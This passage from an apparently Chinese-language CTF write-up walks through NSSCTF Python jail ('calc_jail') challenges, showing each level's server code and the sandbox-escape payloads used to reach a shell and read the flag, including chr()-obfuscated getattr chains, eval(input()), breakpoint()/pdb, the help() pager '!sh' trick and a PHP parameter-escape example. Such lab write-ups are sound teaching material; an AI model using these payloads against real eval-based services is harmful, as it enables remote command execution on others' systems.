class="hljs-number">110</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>))[<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">121</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">109</span>)](<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>))<br></code></pre></td></tr></table></figure><p>然后进如shell交互界面</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># nc node5.anna.nssctf.cn 28230</span><br><br>  _                _                           _       _ _   _                _ __<br> | |              (_)                         (_)     (_) | | |              | /_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt; getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>flag  server.py<br>$ cat flag<br>flag=NSSCTF&#123;99f92fea-d1e0-4c04-<span class="hljs-number">8626</span>-7489979ba8da&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level2"><a href="#calc-jail-beginner-level2" class="headerlink" title="calc_jail_beginner_level2"></a>calc_jail_beginner_level2</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#the length is be limited less than 13</span><br><span class="hljs-comment">#it seems banned some payload </span><br><span class="hljs-comment">#Can u escape it?Good luck!</span><br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _   _                _ ___  </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | | |              | |__ \ </span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |</span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / </span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ </span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|</span><br><span class="hljs-string">              __/ |                          _/ |                                    </span><br><span class="hljs-string">             |___/                          |__/                                                                            </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_data)&gt;<span class="hljs-number">13</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>该题要求payload的长度不大于13，那么就不能直接__import__(‘os’).system(‘sh’)</p><p>但是在php命令执行中，有一种参数逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=ls<br></code></pre></td></tr></table></figure><p>对于这串命令system中POST的参数就会逃逸到参数1中去，对于这个1的长度是没有一点长度限制的</p><p>像这里我们也可以采用类似的手法，想办法搞个命令里面能再输入关键命令，显然<code>input()</code>这个函数就正好符合要求</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28561</span><br><br>  _                _                           _       _ _   _                _ ___<br> | |              (_)                         (_)     (_) | | |              | |__ \<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / /<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt; eval(input())</span><br><span class="hljs-string">__import__(&#x27;</span>os<span class="hljs-string">&#x27;).system(&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>flag  server.py<br>$ cat flag<br>flag=NSSCTF&#123;84302f6b-8b13-4cb2-af5e-ecb2fbc6cc89&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level2-5"><a href="#calc-jail-beginner-level2-5" class="headerlink" title="calc_jail_beginner_level2.5"></a>calc_jail_beginner_level2.5</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#the length is be limited less than 13</span><br><span class="hljs-comment">#it seems banned some payload </span><br><span class="hljs-comment">#banned some unintend sol</span><br><span class="hljs-comment">#Can u escape it?Good luck!</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">s</span>):<br>    BLACKLIST = [<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;input&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> BLACKLIST:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)<br>            exit(<span class="hljs-number">0</span>)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _ _                _ ___    _____ </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span><br><span class="hljs-string">              __/ |                          _/ |                                          </span><br><span class="hljs-string">             |___/                          |__/                                                                                                            </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">filter</span>(input_data)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_data)&gt;<span class="hljs-number">13</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>限制长度不大于13，且ban掉了 exec，input，eval</p><p>经过查阅发现可以使用breakpoint()函数进入pdb调试模式，先用step进入模块，可以说使用list检查代码，发现内容被input_data变量接收</p><p>对其进行赋值。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28031</span><br><br>  _                _                           _       _ _ _                _ ___    _____<br> | |              (_)                         (_)     (_) | |              | |__ \  | ____|<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt; breakpoint()</span><br><span class="hljs-string">--Return--</span><br><span class="hljs-string">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="hljs-string">(Pdb) step</span><br><span class="hljs-string">Answer: None</span><br><span class="hljs-string">--Return--</span><br><span class="hljs-string">&gt; /home/ctf/server.py(34)&lt;module&gt;()-&gt;None</span><br><span class="hljs-string">-&gt; print(&#x27;</span>Answer: &#123;&#125;<span class="hljs-string">&#x27;.format(eval(input_data)))</span><br><span class="hljs-string">(Pdb) list</span><br><span class="hljs-string"> 29     input_data = input(&quot;&gt; &quot;)</span><br><span class="hljs-string"> 30     filter(input_data)</span><br><span class="hljs-string"> 31     if len(input_data)&gt;13:</span><br><span class="hljs-string"> 32         print(&quot;Oh hacker!&quot;)</span><br><span class="hljs-string"> 33         exit(0)</span><br><span class="hljs-string"> 34  -&gt; print(&#x27;</span>Answer: &#123;&#125;<span class="hljs-string">&#x27;.format(eval(input_data)))</span><br><span class="hljs-string">[EOF]</span><br><span class="hljs-string">(Pdb) input_data</span><br><span class="hljs-string">&#x27;</span><span class="hljs-built_in">breakpoint</span>()<span class="hljs-string">&#x27;</span><br><span class="hljs-string">(Pdb) input_data=__import__(&#x27;</span>os<span class="hljs-string">&#x27;).system(&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>flag  server.py<br>$ cat flag<br>flag=NSSCTF&#123;<span class="hljs-number">70489431</span>-119a-4fd3-96ac-f8abbd07c7e1&#125;<br>$<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level3"><a href="#calc-jail-beginner-level3" class="headerlink" title="calc_jail_beginner_level3"></a>calc_jail_beginner_level3</h4><p><a href="https://cheatsheet.haax.fr/linux-systems/programing-languages/python/#pyjail-generate-a-shell">Offensive Security Cheatsheet (haax.fr)</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _   _                _ ____  </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | | |              | |___ \ </span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |</span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt; </span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |</span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ </span><br><span class="hljs-string">              __/ |                          _/ |                                     </span><br><span class="hljs-string">             |___/                          |__/                                                                                       </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><span class="hljs-comment">#the length is be limited less than 7</span><br><span class="hljs-comment">#it seems banned some payload </span><br><span class="hljs-comment">#Can u escape it?Good luck!</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_data)&gt;<span class="hljs-number">7</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br><br></code></pre></td></tr></table></figure><p>  由于限定大小不大于7，那么之前的payload就不行了。查看大佬的wp，发现在python交互式终端中，可以使用help函数来进行rce</p><p>入交互式后，随便查询一种用法，由于太多，会使用more进行展示，造成溢出，在后面使用!命令即可造成命令执行。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">help</span>()<br><br>Welcome to Python <span class="hljs-number">3.8</span><span class="hljs-string">&#x27;s help utility!</span><br><span class="hljs-string"></span><br><span class="hljs-string">If this is your first time using Python, you should definitely check out</span><br><span class="hljs-string">the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enter the name of any module, keyword, or topic to get help on writing</span><br><span class="hljs-string">Python programs and using Python modules.  To quit this help utility and</span><br><span class="hljs-string">return to the interpreter, just type &quot;quit&quot;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">To get a list of available modules, keywords, symbols, or topics, type</span><br><span class="hljs-string">&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes</span><br><span class="hljs-string">with a one-line summary of what it does; to list the modules whose name</span><br><span class="hljs-string">or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">help&gt; modules</span><br></code></pre></td></tr></table></figure><p>输入!sh就可以进入shell里面</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">help</span>&gt; re<br>Help on module re:<br><br>NAME<br>    re - Support <span class="hljs-keyword">for</span> regular expressions (RE).<br><br>MODULE REFERENCE<br>    https://docs.python.org/<span class="hljs-number">3.8</span>/library/re<br><br>    The following documentation <span class="hljs-keyword">is</span> automatically generated <span class="hljs-keyword">from</span> the Python<br>    source files.  It may be incomplete, incorrect <span class="hljs-keyword">or</span> include features that<br>    are considered implementation detail <span class="hljs-keyword">and</span> may vary between Python<br>    implementations.  When <span class="hljs-keyword">in</span> doubt, consult the module reference at the<br>    location listed above.<br><br>DESCRIPTION<br>    This module provides regular expression matching operations similar to<br>    those found <span class="hljs-keyword">in</span> Perl.  It supports both <span class="hljs-number">8</span>-bit <span class="hljs-keyword">and</span> Unicode strings; both<br>    the pattern <span class="hljs-keyword">and</span> the strings being processed can contain null <span class="hljs-built_in">bytes</span> <span class="hljs-keyword">and</span><br>    characters outside the US ASCII <span class="hljs-built_in">range</span>.<br><br>    Regular expressions can contain both special <span class="hljs-keyword">and</span> ordinary characters.<br>    Most ordinary characters, like <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;0&quot;</span>, are the simplest<br>    regular expressions; they simply <span class="hljs-keyword">match</span> themselves.  You can<br>--More--<br>    concatenate ordinary characters, so last matches the string <span class="hljs-string">&#x27;last&#x27;</span>.<br>--More--! sh<br>! sh<br>------------------------<br>--More--!sh<br>!sh<br>------------------------<br>--More--!ls<br>!ls<br>flag  server.py<br>------------------------<br>--More--!cat flag<br>!cat flag<br>flag=NSSCTF&#123;c96135fd-<span class="hljs-number">8475</span>-48df-9a6e-238520cb33ec&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level4"><a href="#calc-jail-beginner-level4" class="headerlink" title="calc_jail_beginner_level4"></a>calc_jail_beginner_level4</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#No danger function,no chr,Try to hack me!!!!</span><br><span class="hljs-comment">#Try to read file ./flag</span><br><br><br>BANLIST = [<span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>]<br><br>eval_func = <span class="hljs-built_in">eval</span><br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> BANLIST:<br>    <span class="hljs-keyword">del</span> __builtins__.__dict__[m]<br><br><span class="hljs-keyword">del</span> __loader__, __builtins__<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">s</span>):<br>    not_allowed = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;&quot;\&#x27;`&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(c <span class="hljs-keyword">in</span> not_allowed <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _   _                _ _  _   </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | | |              | | || |  </span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ </span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  </span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  </span><br><span class="hljs-string">              __/ |                          _/ |                                      </span><br><span class="hljs-string">             |___/                          |__/                                                                                                                                             </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">filter</span>(input_data):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(eval_func(input_data)))<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">禁用了<span class="hljs-built_in">chr</span>函数导致不能使用字符拼接，禁用了<span class="hljs-built_in">__import__</span>导致了<span class="hljs-built_in">help</span>()以及<span class="hljs-built_in">breakpoint</span>()不能使用。<br></code></pre></td></tr></table></figure><p>但是这里可以使用bytes函数以及deocode函数</p><p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 